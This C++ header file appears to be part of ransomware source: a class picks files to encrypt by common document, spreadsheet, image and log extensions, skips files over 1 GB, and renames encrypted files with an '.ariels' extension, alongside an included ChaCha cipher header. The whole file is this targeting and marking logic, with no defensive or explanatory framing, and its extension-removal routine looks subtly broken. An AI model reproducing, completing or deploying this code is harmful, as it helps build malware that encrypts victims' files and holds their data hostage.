#pragma once

#include <fstream>
#include <iostream>
#include <filesystem>
#include "chacha.h"
#include <boost/algorithm/string.hpp>

#define GB 1'073'741'824
#define ENCRYPTED_FILE_EXTENTION ".ariels"

class FileEncryptionDecisions
{
public:
    bool ShouldIEncrypt(const std::string& filePath)
    {
        if (!IsRegularFileExists(filePath))
            return false;

        if (!IsTargetExtention(filePath))
            return false;

        if (IsBiggerThen1GB(filePath))
            return false;

        return true;
    }

    bool IsRegularFileExists(const std::filesystem::path& filePath)
    {
        return (std::filesystem::exists(filePath) && std::filesystem::is_regular_file(filePath));
    }

private:
    bool IsTargetExtention(const std::string& filePath)
    {
        std::vector<std::string> targetExtentions{ ".doc", ".docx", ".xls", ".xlsx", ".txt", ".pdf", ".png", ".jpg", ".log", ".json", ".html", ".cache" };
        auto lambda = [&](const std::string& extention) {return boost::algorithm::ends_with(filePath, extention); };
        return std::any_of(targetExtentions.begin(), targetExtentions.end(), lambda);
    }

    bool IsBiggerThen1GB(const std::string& filePath)
    {
        return std::filesystem::file_size(filePath) > GB ? true : false;
    }

public:
    void EncryptedFileExtension(const std::string& filePath)
    {
        if (boost::ends_with(filePath, ENCRYPTED_FILE_EXTENTION))
            RemoveEncryptedFileExtention(filePath);
        else
            AddEncryptedFileExtention(filePath);
    }
private:
    void RemoveEncryptedFileExtention(const std::string& filePath)
    {
        auto extentionLength(strlen(ENCRYPTED_FILE_EXTENTION));
        auto newFileName(filePath.substr(0, filePath.size() - extentionLength));
        newFileName.erase(filePath.size() - extentionLength, extentionLength);
        std::ignore = std::rename(filePath.c_str(), newFileName.c_str());
    }

    void AddEncryptedFileExtention(const std::string& filePath)
    {
        std::string newFileName(filePath + ENCRYPTED_FILE_EXTENTION);
        std::ignore = std::rename(filePath.c_str(), newFileName.c_str());
    }
};
